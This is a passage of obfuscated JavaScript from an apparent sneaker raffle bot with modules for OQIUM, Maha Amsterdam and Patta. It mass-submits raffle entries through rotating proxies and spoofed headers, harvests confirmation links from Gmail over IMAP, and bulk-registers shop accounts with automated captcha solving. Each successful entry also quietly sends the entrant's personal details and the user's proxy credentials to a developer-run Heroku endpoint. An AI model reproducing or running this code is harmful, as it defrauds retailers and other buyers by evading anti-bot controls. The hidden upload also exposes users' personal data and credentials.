                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x45942d, _0x50d9c7, _0x316dc2) {
                    var _0x2a637b = _0x50d9c7, _0x263b46 = 0x0;
                    for (var _0x302608 = 0x0; _0x302608 < _0x50d9c7['length']; _0x302608++) {
                        maxTasks = _0x24de00['threads'];
                        while (_0x263b46 >= maxTasks) {
                            await _0x254c61(_0x24de00['delay']);
                        }
                        async function _0x4052bf(_0x1f67ab, _0x23066f, _0xfc1eac, _0x357b63) {
                            try {
                                await _0x4626f3(_0x23066f, _0x357b63);
                            } catch (_0x17343c) {
                                throw new Error(_0x17343c);
                            }
                            async function _0x59de3b(_0x52b34e, _0x1e7186, _0x5e3449, _0x3f5ca1, _0x3783fb) {
                                _0x263b46++;
                                var _0x504d23, _0x34f5ba = {}, _0x23f1e3 = [], _0x9fd52f = {}, _0x423b07 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x5c02dc = Math['round'](Math['random']() * (_0x423b07['length'] - 0x1));
                                !_0x3f5ca1 && (_0x3f5ca1 = {});
                                if (_0x1e7186 != 'ver') {
                                    _0x1bf238(_0x5e3449['name'] + '\x20Task\x20' + (_0x52b34e + 0x1) + '\x20/\x20' + _0x3f5ca1['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577), _0x23f1e3 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x4a1218
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x3f5ca1[_0x52b34e]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x24de00['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x5e0c2d
                                            }
                                        ]
                                    }], _0x9fd52f = { 'embeds': _0x23f1e3 }, _0x34f5ba = _0x5e3449['data'], _0x34f5ba['data']['attributes']['email'] = '' + _0x3f5ca1[_0x52b34e]['Email'];
                                    if (_0x3f5ca1[_0x52b34e]['Size'] == 'RANDOM') {
                                    }
                                    _0x34f5ba['data']['attributes']['properties']['$first_name'] = '' + _0x3f5ca1[_0x52b34e]['FirstName'], _0x34f5ba['data']['attributes']['properties']['$last_name'] = '' + _0x3f5ca1[_0x52b34e]['LastName'], _0x34f5ba['data']['attributes']['properties']['$address1'] = _0x3f5ca1[_0x52b34e]['Address1'] + '\x20' + _0x3f5ca1[_0x52b34e]['Address2'] + '\x20' + _0x3f5ca1[_0x52b34e]['HouseNumber'], _0x34f5ba['data']['attributes']['properties']['$zip'] = '' + _0x3f5ca1[_0x52b34e]['Zip'], _0x34f5ba['data']['attributes']['properties']['$city'] = '' + _0x3f5ca1[_0x52b34e]['City'], _0x34f5ba['data']['attributes']['properties']['$country'] = '' + _0x3f5ca1[_0x52b34e]['Country'], _0x3f5ca1[_0x52b34e]['Size'] == 'RANDOM' ? _0x34f5ba['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x423b07[_0x5c02dc] : _0x34f5ba['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3f5ca1[_0x52b34e]['Size'], _0x34f5ba['data']['attributes']['properties']['$phone_number'] = '' + _0x3f5ca1[_0x52b34e]['Phone'], _0x34f5ba['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3f5ca1[_0x52b34e]['Follower'];
                                }
                                if (_0x24de00['useRandomProxy'] = ![])
                                    var _0x74d3dd = _0x3783fb[_0x52b34e]['split'](':');
                                else
                                    var _0x288c1e = Math['round'](Math['random']() * (_0x3783fb['length'] - 0x1)), _0x74d3dd = _0x3783fb[_0x288c1e]['split'](':');
                                var _0x50955a = {
                                    'jar': _0x3be8c2,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5e3449['url'],
                                    'headers': _0x5e3449['headers'],
                                    'body': JSON['stringify'](_0x34f5ba),
                                    'proxy': 'http://' + _0x74d3dd[0x2] + ':' + _0x74d3dd[0x3] + '@' + _0x74d3dd[0x0] + ':' + _0x74d3dd[0x1]
                                };
                                return _0x1e7186 != 'ver' && (_0x50955a['url'] = _0x5e3449['url'], _0x50955a['headers'] = _0x5e3449['headers']), _0x1e7186 == 'ver' && (_0x50955a['method'] = 'GET'), new Promise(function (_0xfd7e44, _0x47c3f2) {
                                    callback = async (_0x44a373, _0x1fa63f, _0xea62bc) => {
                                        if (!_0x44a373 && _0x1fa63f['statusCode'] == 0xca || !_0x44a373 && _0x1fa63f['statusCode'] == 0xc8) {
                                            if (_0x1e7186 != 'ver') {
                                                var _0x453773 = await _0x18ad5f(_0x3f5ca1[_0x52b34e], _0x5e3449, 'dev', ![]), _0x1a469d = await _0x18ad5f(_0x3f5ca1[_0x52b34e], _0x5e3449, 'pub', ![]);
                                                const _0x461547 = {
                                                    'succesDEVMSG': { 'embeds': [_0x453773] },
                                                    'succesPUBMSG': { 'embeds': [_0x1a469d] }
                                                };
                                                let _0x17475 = _0x3f5ca1[_0x52b34e];
                                                try {
                                                    prxdata = {
                                                        'username': _0x4a1218['replace']('#', ''),
                                                        'module': _0x5e3449['name'],
                                                        'entrydata': JSON['stringify'](_0x17475),
                                                        'proxy': '' + _0x3783fb[_0x52b34e]
                                                    };
                                                    var _0x52ebb5 = JSON['stringify'](prxdata);
                                                    let _0x40d6f9 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x52ebb5, _0x40d6f9);
                                                } catch (_0x4bac53) {
                                                }
                                                if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                                                    try {
                                                        await _0x2dfd24(_0x24de00['webhook'], _0x461547['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x461547['succesDEVMSG']), await _0x254c61(0xc8);
                                                try {
                                                    await _0x2dfd24(_0x4f6cb7, _0x461547['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x547244(_0x3f5ca1[_0x52b34e], _0x5e3449);
                                            }
                                            _0x263b46--, _0xfd7e44(console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x5e3449['name'] + ']\x20Task\x20' + (_0x52b34e + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1e7186 != 'ver') {
                                                var _0x5625ac = '' + _0x44a373, _0x506ddc = await _0x18ad5f(_0x3f5ca1[_0x52b34e], _0x5e3449, 'dev', !![], _0x5625ac), _0x210189 = {};
                                                _0x210189['errorDEV'] = { 'embeds': [_0x506ddc] }, _0x9088f0(_0x3f5ca1[_0x52b34e], _0x5e3449), _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x210189['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x210189['errorDEV']);
                                            }
                                            _0x263b46--, _0x47c3f2(console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x5e3449['name'] + ']\x20Task\x20' + (_0x52b34e + 0x1) + ':\x20' + _0x44a373)));
                                        }
                                    };
                                    try {
                                        _0x1e7186 != 'ver' && console['log'](_0x36583e() + '\x20[' + _0x5e3449['name'] + ']\x20Task\x20' + (_0x52b34e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x34f5ba['data']['attributes']['email']), _0x35812d(_0x50955a, callback);
                                    } catch (_0x2d026f) {
                                        console['log'](_0x36583e() + '\x20Task\x20' + (_0x52b34e + 0x1) + ':\x20' + _0x2d026f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x59de3b(_0x357b63, 'nor', _0x1f67ab, _0x23066f, _0xfc1eac), console['log'](_0x36583e() + '\x20[' + _0x1f67ab['name'] + ']\x20Sleeping\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                            } catch (_0x24dcc1) {
                            }
                        }
                        _0x4052bf(_0x45942d, _0x2a637b, _0x316dc2, _0x302608), await _0x254c61(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x42db74, _0x1bccd7, _0x45c69b) {
                    var _0x1bccd7 = [], _0xd7678c = ![];
                    async function _0xd600a6() {
                        var _0x54e868 = new _0x2796bc({
                            'user': _0x24de00['masterMail'],
                            'password': _0x24de00['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1bfedf(_0x168050) {
                            _0x54e868['openBox']('INBOX', ![], _0x168050);
                        }
                        _0x54e868['once']('ready', function () {
                            _0x1bfedf(function (_0xe1841e, _0xcc6a79) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xe1841e)
                                    throw _0xe1841e;
                                _0x54e868['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x2f617b, _0x1fe144) {
                                    if (!_0x1fe144 || !_0x1fe144['length'])
                                        console['log'](_0x36583e() + '\x20[' + _0x42db74['name'] + ']\x20No\x20mails\x20found'), _0x54e868['end']();
                                    else {
                                        var _0x57b5c8 = _0x54e868['seq']['fetch'](_0x1fe144, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x57b5c8['on']('message', function (_0x49733e, _0x2fba7b) {
                                            var _0x23c1c2 = '(#' + _0x2fba7b + ')\x20';
                                            _0x49733e['on']('body', function (_0x13fa53, _0x26e490) {
                                                _0x1a979e(_0x13fa53, (_0x1a7a85, _0x51dded) => {
                                                    var _0x2396b5 = _0x51dded['text']['split']('(')[0x1], _0x14c746 = _0x2396b5['split'](')')[0x0];
                                                    _0x1bccd7['push'](_0x14c746);
                                                });
                                            }), _0x49733e['once']('end', function () {
                                            });
                                        }), _0x57b5c8['once']('error', function (_0x3e9368) {
                                            console['log']('Fetch\x20error:\x20' + _0x3e9368), _0xd7678c = !![];
                                        }), _0x57b5c8['once']('end', function () {
                                            _0x54e868['end'](), _0xd7678c = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x54e868['once']('error', function (_0x55ab86) {
                            console['log'](_0x55ab86), _0xd7678c = !![];
                        }), _0x54e868['once']('end', async function () {
                            _0xd7678c = !![];
                        }), _0x54e868['connect']();
                    }
                    async function _0x3f3a69(_0x1678bf, _0xd9eda1, _0x4d0cfc) {
                        for (var _0x5850a5 = 0x0; _0x5850a5 < _0xd9eda1['length']; _0x5850a5++) {
                            async function _0x21eabd(_0x3f3e0d, _0x3f4f50, _0xcf8bdb, _0x5dc55c, _0x5d3e1c) {
                                var _0x528a2c, _0xbd303f = {}, _0x4c5763 = [], _0x3fc8ca = {}, _0x22a4ef = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x49fcb8 = Math['round'](Math['random']() * (_0x22a4ef['length'] - 0x1));
                                _0x5dc55c[_0x3f3e0d]['Size'] == 'RANDOM' && (_0x5dc55c[_0x3f3e0d]['Size'] = _0x22a4ef[_0x49fcb8]);
                                !_0x5dc55c && (_0x5dc55c = {});
                                if (_0x24de00['useRandomProxy'] = ![])
                                    var _0x12c88a = _0x5d3e1c[_0x3f3e0d]['split'](':');
                                else
                                    var _0xfeda05 = Math['round'](Math['random']() * (_0x5d3e1c['length'] - 0x1)), _0x12c88a = _0x5d3e1c[_0xfeda05]['split'](':');
                                var _0x53b04c = {
                                    'jar': _0x3be8c2,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xcf8bdb['url'],
                                    'headers': _0xcf8bdb['headers'],
                                    'body': JSON['stringify'](_0xbd303f),
                                    'proxy': 'http://' + _0x12c88a[0x2] + ':' + _0x12c88a[0x3] + '@' + _0x12c88a[0x0] + ':' + _0x12c88a[0x1]
                                };
                                return _0x3f4f50 == 'ver' && (_0x53b04c['method'] = 'GET', _0x53b04c['url'] = _0x5dc55c[_0x3f3e0d]), new Promise(function (_0x2b7b67, _0xd90f82) {
                                    callback = async (_0x571cbe, _0x271172, _0xb1174b) => {
                                        !_0x571cbe && _0x271172['statusCode'] == 0xca || !_0x571cbe && _0x271172['statusCode'] == 0xc8 ? _0x2b7b67(console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0xcf8bdb['name'] + ']\x20Task\x20' + (_0x3f3e0d + 0x1) + ':\x20Raffle\x20Entered!'))) : _0xd90f82(console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0xcf8bdb['name'] + ']\x20Task\x20' + (_0x3f3e0d + 0x1) + ':\x20' + _0x571cbe)));
                                    };
                                    try {
                                        _0x3f4f50 != 'ver' ? console['log'](_0x36583e() + '\x20[' + _0xcf8bdb['name'] + ']\x20Task\x20' + (_0x3f3e0d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xbd303f['data']['attributes']['email']) : console['log'](_0x36583e() + '\x20[' + _0xcf8bdb['name'] + ']\x20Task\x20' + (_0x3f3e0d + 0x1) + ':\x20Fetching\x20Response'), _0x35812d(_0x53b04c, callback);
                                    } catch (_0x2dc5e6) {
                                        console['log'](_0x36583e() + '\x20Task\x20' + (_0x3f3e0d + 0x1) + ':\x20' + _0x2dc5e6);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x21eabd(_0x5850a5, 'ver', _0x1678bf, _0xd9eda1, _0x4d0cfc), console['log'](_0x36583e() + '\x20[' + _0x1678bf['name'] + ']\x20Sleeping\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                            } catch (_0x437a6a) {
                                console['log'](_0x437a6a), await _0x254c61(0x2710);
                            }
                        }
                    }
                    try {
                        _0xd600a6();
                        while (!_0xd7678c) {
                            await _0x254c61(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1bccd7['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x524a6c) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x524a6c), await _0x254c61(0x2710);
                    }
                    try {
                        await _0x3f3a69(_0x42db74, _0x1bccd7, _0x45c69b);
                    } catch (_0xf15fec) {
                        console['log'](_0xf15fec), await _0x254c61(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x55d448, _0xadf02b, _0x4fdcc1) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4235e7 = 0x0; _0x4235e7 < _0xadf02b['length']; _0x4235e7++) {
                        var _0x5e60fa = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a1218
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x24de00['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e0c2d
                                }
                            ]
                        }];
                        const _0x27744a = { 'embeds': _0x5e60fa };
                        _0x1bf238(_0x55d448['name'] + '\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20/\x20' + _0xadf02b['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        try {
                            await _0x4626f3(_0xadf02b, _0x4235e7);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x216ce9 = await _0x18ad5f(_0xadf02b[_0x4235e7], _0x55d448, 'acc', ![]);
                        const _0x2861c5 = { 'succesDEVMSG': { 'embeds': [_0x216ce9] } };
                        if (_0xadf02b[_0x4235e7]['Email'] == '' || _0xadf02b[_0x4235e7]['FirstName'] == '' || _0xadf02b[_0x4235e7]['LastName'] == '') {
                            console['log'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x254c61(0x7d0);
                            continue;
                        }
                        (_0xadf02b[_0x4235e7]['Password'] == '' || _0xadf02b[_0x4235e7] == undefined) && _0xadf02b[_0x4235e7]['Password'] == 'JRaffles23!';
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x269cf2 = _0x4fdcc1[_0x4235e7]['split'](':');
                        else
                            var _0x4e9eef = Math['round'](Math['random']() * (_0x4fdcc1['length'] - 0x1)), _0x269cf2 = _0x4fdcc1[_0x4e9eef]['split'](':');
                        var _0x426ec0;
                        try {
                            _0x426ec0 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x269cf2[0x0] + ':' + _0x269cf2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x426ec0 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x269cf2[0x0] + ':' + _0x269cf2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x56161d = await _0x426ec0['newPage']();
                            await _0x56161d['authenticate']({
                                'username': '' + _0x269cf2[0x2],
                                'password': '' + _0x269cf2[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x55d448['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56161d['setRequestInterception'](!![]), _0x56161d['on']('request', _0xf39ae8 => {
                                _0xf39ae8['resourceType']() === 'image' || _0xf39ae8['resourceType']() === 'font' || _0xf39ae8['resourceType']() === 'media' ? _0xf39ae8['abort']() : _0xf39ae8['continue']();
                            }), await _0x56161d['goto']('https://patta.nl/account/register'), await _0x254c61(0xbb8), await _0x56161d['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x36583e() + '\x20[' + _0x55d448['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20Filling\x20information'), await _0x56161d['type']('#RegisterForm-FirstName', '' + _0xadf02b[_0x4235e7]['FirstName']), await _0x254c61(0x226), await _0x56161d['type']('#RegisterForm-LastName', '' + _0xadf02b[_0x4235e7]['LastName']), await _0x254c61(0x226), await _0x56161d['type']('#RegisterForm-email', '' + _0xadf02b[_0x4235e7]['Email']), await _0x254c61(0x226), await _0x56161d['type']('#RegisterForm-password', '' + _0xadf02b[_0x4235e7]['Password']), await _0x254c61(0x226), console['log'](_0x36583e() + '\x20[' + _0x55d448['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20Submitting..'), await _0x56161d['$eval']('#RegisterForm', _0x3cbc7e => _0x3cbc7e['submit']()), await _0x254c61(0x1f40);
                            try {
                                await _0x56161d['waitForSelector']('.home-page-grid__collection'), await _0x254c61(0x1f4), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x55d448['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20Account\x20' + _0xadf02b[_0x4235e7]['Email'] + '\x20Generated!')), _0x3e92a1['appendFileSync']('../accounts/patta.csv', '\x0a' + _0xadf02b[_0x4235e7]['Email'] + ',' + _0xadf02b[_0x4235e7]['Password']), console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x55d448['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20Account\x20' + _0xadf02b[_0x4235e7]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x2861c5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2dfd24(_0x43241a, _0x2861c5['succesDEVMSG']);
                            } catch (_0x592bae) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x592bae));
                            }
                        } catch (_0x524652) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0x4235e7 + 0x1) + '\x20:\x20' + _0x524652));
                        } finally {
                            _0x426ec0 && _0x426ec0['close'](), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x18ef48, _0x6424f8, _0x578688) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2be577 = 0x0; _0x2be577 < _0x6424f8['length']; _0x2be577++) {
                        var _0x5520a4;
                        if (_0x5414b2 != 'yes')
                            var _0x5414b2 = '', _0x7a3849 = 0x0;
                        _0x1bf238(_0x18ef48['name'] + '\x20Task\x20' + (_0x2be577 + 0x1) + '\x20/\x20' + _0x6424f8['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        try {
                            await _0x4626f3(_0x6424f8, _0x2be577);
                        } catch {
                            _0x5414b2 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x6424f8[_0x2be577]['Email'] == '' || _0x6424f8[_0x2be577]['Password'] == '' || _0x6424f8[_0x2be577]['FirstName'] == '' || _0x6424f8[_0x2be577]['LastName'] == '') {
                            console['log'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x27ab40 = _0x578688[_0x2be577]['split'](':');
                        else
                            var _0x5595df = Math['round'](Math['random']() * (_0x578688['length'] - 0x1)), _0x27ab40 = _0x578688[_0x5595df]['split'](':');
                        var _0x497a61;
                        try {
                            _0x497a61 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x27ab40[0x0] + ':' + _0x27ab40[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x497a61 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x27ab40[0x0] + ':' + _0x27ab40[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xeb544b = await _0x497a61['newPage']();
                            await _0xeb544b['authenticate']({
                                'username': '' + _0x27ab40[0x2],
                                'password': '' + _0x27ab40[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xeb544b['setRequestInterception'](!![]), _0xeb544b['on']('request', _0x20995c => {
                                _0x20995c['resourceType']() === 'image' || _0x20995c['resourceType']() === 'font' || _0x20995c['resourceType']() === 'media' ? _0x20995c['abort']() : _0x20995c['continue']();
                            }), await _0xeb544b['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xeb544b['waitForSelector']('#CustomerEmail'), console['log'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Logging\x20in..'), await _0xeb544b['type']('#CustomerEmail', '' + _0x6424f8[_0x2be577]['Email']), await _0x254c61(0x12c), await _0xeb544b['type']('#CustomerPassword', '' + _0x6424f8[_0x2be577]['Password']), await _0x254c61(0x226), await _0xeb544b['$eval']('#customer_login', _0x3198e2 => _0x3198e2['submit']());
                            try {
                                await _0xeb544b['waitForSelector']('#orders'), await _0x254c61(0x4b0);
                            } catch {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xeb544b['goto']('' + _0x6424f8[_0x2be577]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x254c61(0xbb8), console['log'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xeb544b['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
